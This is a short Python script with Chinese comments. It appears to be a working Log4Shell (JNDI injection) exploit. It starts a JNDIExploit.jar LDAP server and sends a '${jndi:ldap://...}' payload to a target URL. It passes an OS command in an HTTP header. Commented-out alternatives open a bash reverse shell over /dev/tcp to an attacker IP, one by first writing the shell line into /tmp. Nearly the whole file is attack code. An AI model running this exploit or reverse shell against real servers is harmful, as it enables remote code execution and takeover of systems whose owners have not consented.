# 放在 JNDIExploit 下使用
# post方式不要 url encode
import os
from urllib.parse import quote

import requests

url = 'http://192.168.127.129:49153/hello?payload=' + '%s'
host = '192.168.50.161'
os.system('start java -jar JNDIExploit.jar -i %s' % host)
headers = {
    'cmd': 'ls /tmp',
    # 'cmd': 'bash -c "bash -i >& /dev/tcp/192.168.50.161/5555 0>&1"',
    # 'cmd': 'echo "bash -i >& /dev/tcp/192.168.50.161/5555 0>&1" > /tmp/aab && bash /tmp/aab',
}

payload = '${jndi:ldap://%s:1389/TomcatBypass/TomcatEcho}' % host
print(url % quote(payload, safe="./$:"))
response = requests.get(url % quote(payload, safe="./$:"), headers=headers, verify=False, )
# response = requests.post(url % payload, safe="./$:"), headers=headers, verify=False, )
print(response.text)
